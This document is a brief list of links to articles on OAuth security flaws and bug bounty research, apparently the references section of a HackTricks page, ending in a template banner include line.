- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)

{{#include ../banners/hacktricks-training.md}}
